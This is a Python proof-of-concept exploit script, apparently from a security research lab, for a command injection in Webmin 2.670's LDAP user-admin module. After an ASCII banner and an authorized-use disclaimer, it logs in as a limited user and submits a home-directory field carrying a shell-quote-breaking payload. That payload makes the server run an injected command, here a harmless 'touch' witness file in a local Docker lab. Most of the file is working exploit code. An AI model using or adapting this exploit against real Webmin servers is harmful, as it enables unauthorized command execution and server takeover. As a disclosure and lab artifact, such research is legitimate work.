#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: webmin-ldap-mv-quote (Critical: 9.1)
#  Vendor: Webmin
#  Versions: Webmin 2.670
#  Impact: ldap-useradmin save_user mv backticks; quote in home runs as miniserv
#  Requires: Docker, git, python3; loopback; OpenLDAP sidecar
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "webmin-ldap-mv-quote"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _builtins.print(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _builtins.print(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_builtins.print = _cprint

"""Webmin 2.670 ldap-useradmin/save_user.cgi mv backticks vs useradmin quotemeta."""

import http.client
import os
import subprocess
import time
import urllib.parse
from dataclasses import dataclass
from pathlib import Path

LABEL = "WEBMIN-H22-LDAP-MV"
WITNESS = "WEBMIN-H22-LDAP-MV"
IMAGE = "webmin-lab:2.670"
PIN = "2.670"
HOST = "127.0.0.1"
PORT = 18470
BASE = f"http://{HOST}:{PORT}"
COMPOSE = os.environ.get("COMPOSE_PROJECT_NAME", "webminh22")
HERE = Path(__file__).resolve().parent
LIMITED_USER = "ldapmod"
LIMITED_PASS = "ldapmodpass"
LDAP_DN = "uid=labuser,ou=People,dc=lab,dc=invalid"
LDAP_USER = "labuser"
UNIX_USER = "unixuser"
WITNESS_PATH = f"/tmp/{WITNESS}"
INJECT_HOME = f"/home/labuser'; touch {WITNESS_PATH}; echo '"


class ApiError(Exception):
    def __init__(self, reason: str) -> None:
        super().__init__(reason)
        self.reason = reason


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str
    headers: dict[str, str]
    cookies: dict[str, str]


def log(msg: str) -> None:
    print(msg, flush=True)


def clip(text: str, limit: int = 240) -> str:
    compact = " ".join((text or "").split())
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )


def exec_webmin(*args: str, timeout: int = 30) -> subprocess.CompletedProcess[str]:
    return compose("exec", "-T", "webmin", *args, timeout=timeout)


def parse_set_cookie(raw: list[tuple[str, str]]) -> dict[str, str]:
    cookies: dict[str, str] = {}
    for key, value in raw:
        if key.lower() != "set-cookie":
            continue
        pair = value.split(";", 1)[0]
        name, _, val = pair.partition("=")
        if name.strip():
            cookies[name.strip()] = val.strip()
    return cookies


def request(
    method: str,
    path: str,
    *,
    cookies: dict[str, str] | None = None,
    form: dict[str, str] | None = None,
    referer: str | None = None,
    timeout: int = 45,
) -> HttpResult:
    headers = {
        "Host": f"{HOST}:{PORT}",
        "User-Agent": "h22-lab",
        "Referer": referer or f"{BASE}/",
    }
    cookie_header = "; ".join(f"{k}={v}" for k, v in (cookies or {}).items())
    if cookie_header:
        headers["Cookie"] = cookie_header
    body: bytes | None = None
    if form is not None:
        body = urllib.parse.urlencode(form).encode("utf-8")
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Content-Length"] = str(len(body))
    conn = http.client.HTTPConnection(HOST, PORT, timeout=timeout)
    try:
        # MiniServ 401s UA "webmin*" and Python's default Accept-Encoding: identity.
        conn.putrequest(method, path, skip_host=True, skip_accept_encoding=True)
        for key, value in headers.items():
            conn.putheader(key, value)
        conn.endheaders(body)
        resp = conn.getresponse()
        raw_headers = resp.getheaders()
        payload = resp.read().decode("utf-8", errors="replace")
        merged = {k.lower(): v for k, v in raw_headers}
        return HttpResult(resp.status, payload, merged, parse_set_cookie(raw_headers))
    except (OSError, http.client.HTTPException) as exc:
        raise ApiError("unreachable") from exc
    finally:
        conn.close()


def wait_http() -> None:
    last = "none"
    for attempt in range(1, 61):
        try:
            result = request("GET", "/session_login.cgi", cookies={"testing": "1"})
        except ApiError as exc:
            last = exc.reason
            log(f"IOC http-wait attempt={attempt} err={last}")
            time.sleep(2)
            continue
        last = str(result.status)
        log(f"IOC http-wait attempt={attempt} http={result.status}")
        if result.status in {200, 401}:
            return
        time.sleep(2)
    raise ApiError(f"webmin-not-ready-{last}")


def login() -> dict[str, str]:
    result = request(
        "POST",
        "/session_login.cgi",
        cookies={"testing": "1"},
        form={"page": "/", "user": LIMITED_USER, "pass": LIMITED_PASS},
        referer=f"{BASE}/session_login.cgi",
    )
    sid = result.cookies.get("sid")
    log(f"IOC login http={result.status} sid={'yes' if sid else 'no'}")
    if not sid or sid == "x":
        raise ApiError(f"login-{result.status}")
    return {"testing": "1", "sid": sid}


def pin_ok() -> bool:
    proc = exec_webmin("cat", "/etc/webmin/version")
    version = (proc.stdout or "").strip()
    log(f"IOC pin-version={version or 'missing'} image={IMAGE} expect={PIN}")
    return version == PIN


def acl_movehome(module: str) -> str:
    proc = exec_webmin("cat", f"/etc/webmin/{module}/{LIMITED_USER}.acl")
    text = proc.stdout or ""
    log(f"IOC acl-{module}={clip(text.replace(chr(10), ';'))}")
    for line in text.splitlines():
        if line.startswith("movehome="):
            return line.split("=", 1)[1].strip()
    return ""


def witness_exists() -> bool:
    return exec_webmin("test", "-f", WITNESS_PATH).returncode == 0


def rm_witness() -> None:
    exec_webmin("rm", "-f", WITNESS_PATH)


def home_is_dir(path: str) -> bool:
    return exec_webmin("test", "-d", path).returncode == 0


def ldap_save_fields() -> dict[str, str]:
    return {
        "dn": LDAP_DN,
        "user": LDAP_USER,
        "uid": "1001",
        "real": "Lab User",
        "home": INJECT_HOME,
        "home_base": "0",
        "shell": "/bin/sh",
        "gid": "1001",
        "gidmode": "0",
        "passmode": "1",
        "movehome": "1",
        "chuid": "0",
        "chgid": "0",
        "others": "0",
        "min": "",
        "max": "",
        "warn": "",
        "inactive": "",
        "forcechange": "0",
    }


def useradmin_save_fields() -> dict[str, str]:
    return {
        "old": UNIX_USER,
        "user": UNIX_USER,
        "uid": "1002",
        "gid": UNIX_USER,
        "real": "Unix User",
        "home": INJECT_HOME,
        "home_base": "0",
        "shell": "/bin/sh",
        "passmode": "1",
        "movehome": "1",
        "chuid": "0",
        "chgid": "0",
        "others": "0",
        "min": "0",
        "max": "99999",
        "warn": "7",
        "inactive": "0",
        "forcechange": "0",
        "sshkey": "",
    }


def finish(lines: list[str], last: str) -> int:
    log(last)
    lines.append(last)
    (HERE / "poc-last-run.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")
    return 0 if last.startswith("SUCCESS ") else 1


def main() -> int:
    lines: list[str] = []

    def note(msg: str) -> None:
        log(msg)
        lines.append(msg)

    try:
        wait_http()
        if not pin_ok():
            return finish(lines, f"FAIL {LABEL} pin-mismatch {WITNESS}")
        ldap_acl = acl_movehome("ldap-useradmin")
        user_acl = acl_movehome("useradmin")
        if ldap_acl != "2":
            return finish(lines, f"FAIL {LABEL} ldap-acl-movehome-{ldap_acl or 'missing'} {WITNESS}")
        if user_acl != "1":
            return finish(lines, f"FAIL {LABEL} useradmin-acl-movehome-{user_acl or 'missing'} {WITNESS}")
        if not home_is_dir("/home/labuser"):
            return finish(lines, f"FAIL {LABEL} ldap-home-missing {WITNESS}")
        if not home_is_dir("/home/unixuser"):
            return finish(lines, f"FAIL {LABEL} unix-home-missing {WITNESS}")

        cookies = login()
        rm_witness()
        if witness_exists():
            return finish(lines, f"FAIL {LABEL} witness-preexists {WITNESS}")

        unix_edit = request(
            "GET",
            "/useradmin/edit_user.cgi?" + urllib.parse.urlencode({"user": UNIX_USER}),
            cookies=cookies,
            referer=f"{BASE}/useradmin/",
        )
        note(f"IOC useradmin-edit http={unix_edit.status} body={clip(unix_edit.body)}")
        if unix_edit.status != 200 or UNIX_USER not in unix_edit.body:
            return finish(lines, f"FAIL {LABEL} useradmin-edit-{unix_edit.status} {WITNESS}")

        unix_save = request(
            "POST",
            "/useradmin/save_user.cgi",
            cookies=cookies,
            form=useradmin_save_fields(),
            referer=f"{BASE}/useradmin/edit_user.cgi?user={UNIX_USER}",
        )
        note(f"IOC useradmin-save http={unix_save.status} body={clip(unix_save.body)}")
        if witness_exists():
            return finish(lines, f"FAIL {LABEL} useradmin-quotemeta-fired {WITNESS}")
        note("IOC useradmin-negative witness-absent")

        ldap_edit = request(
            "GET",
            "/ldap-useradmin/edit_user.cgi?" + urllib.parse.urlencode({"dn": LDAP_DN}),
            cookies=cookies,
            referer=f"{BASE}/ldap-useradmin/",
        )
        note(f"IOC ldap-edit http={ldap_edit.status} body={clip(ldap_edit.body)}")
        if ldap_edit.status != 200 or LDAP_USER not in ldap_edit.body:
            return finish(lines, f"FAIL {LABEL} ldap-edit-{ldap_edit.status} {WITNESS}")

        ldap_save = request(
            "POST",
            "/ldap-useradmin/save_user.cgi",
            cookies=cookies,
            form=ldap_save_fields(),
            referer=f"{BASE}/ldap-useradmin/edit_user.cgi",
        )
        note(f"IOC ldap-save http={ldap_save.status} body={clip(ldap_save.body)}")
        if not witness_exists():
            return finish(lines, f"FAIL {LABEL} ldap-mv-no-witness {WITNESS}")
        note(f"IOC witness-path={WITNESS_PATH}")
        return finish(lines, f"SUCCESS {LABEL} ldap-useradmin-mv-quote {WITNESS}")
    except ApiError as exc:
        return finish(lines, f"FAIL {LABEL} {exc.reason} {WITNESS}")
    except OSError:
        return finish(lines, f"FAIL {LABEL} os-error {WITNESS}")
    except subprocess.TimeoutExpired:
        return finish(lines, f"FAIL {LABEL} timeout {WITNESS}")


if __name__ == "__main__":
    raise SystemExit(main())

